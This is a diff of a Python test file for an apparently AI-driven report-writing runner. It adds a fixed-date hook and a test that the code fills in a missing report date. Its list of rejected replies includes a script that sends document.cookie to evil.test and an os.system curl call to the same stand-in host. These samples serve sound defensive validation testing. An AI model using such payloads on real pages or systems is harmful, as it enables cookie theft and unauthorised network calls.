@@ -10,6 +10,7 @@ import asyncio
 import json
 import subprocess
 import sys
+from datetime import date
 from pathlib import Path
 from typing import Any
 
@@ -52,7 +53,7 @@ class Script(FakeModelProvider):
 
 def run_runner(reply: str, brief: Any = PDF_BRIEF, unit: dict[str, Any] = UNIT) -> tuple[Any, Script]:
     provider = Script(reply)
-    runner = ToolUnitRunner({"writer": provider})
+    runner = ToolUnitRunner({"writer": provider}, today=lambda: date(2026, 10, 16))
     outcome = asyncio.run(runner.run(unit, UnitContext("A_s0", (), brief=brief)))
     return outcome, provider
 
@@ -61,7 +62,7 @@ class AsDeliver:
     """Runs the shared runner as a writer's `deliver` unit (the harness test plans build specialist units)."""
 
     def __init__(self, reply: str, brief: Any = PDF_BRIEF) -> None:
-        self.inner, self.brief = ToolUnitRunner({"writer": Script(reply)}), brief
+        self.inner, self.brief = ToolUnitRunner({"writer": Script(reply)}, today=lambda: date(2026, 10, 16)), brief
 
     async def run(self, unit: dict[str, Any], context: UnitContext) -> Any:
         unit = unit | {"role": "writer", "unit_type": "deliver"}
@@ -129,7 +130,6 @@ BAD = {
     "script": "<script>fetch('https://evil.test/' + document.cookie)</script>",
     "python": "import os\nos.system('curl https://evil.test')",
     "unknown field": json.dumps(SPEC | {"script": "alert(1)"}),
-    "missing date": json.dumps({k: v for k, v in SPEC.items() if k != "date"}),
     "bad chart link": json.dumps(SPEC | {"charts": [dict(SPEC["charts"][0], table_id="nope")]}),
     "nan": GOOD.replace('"Sales rose."', '"x"').replace('["2026", 6]', '["2026", NaN]'),
     "duplicate keys": '{"title": "a", "title": "b", "date": "2026-10-08"}',
@@ -137,6 +137,11 @@ BAD = {
     "oversize": json.dumps(SPEC | {"subtitle": "x" * 3_000_000}),
     "blank": "   ",
 }
+
+
+def test_HR_1_FR_INT_missing_model_date_is_stamped_by_code() -> None:
+    outcome, _ = run_runner(json.dumps({k: v for k, v in SPEC.items() if k != "date"}))
+    assert outcome.success and json.loads(outcome.outputs[0].spec_text)["date"] == "2026-10-16"
 
 
 @pytest.mark.parametrize("reply", list(BAD.values()), ids=list(BAD))
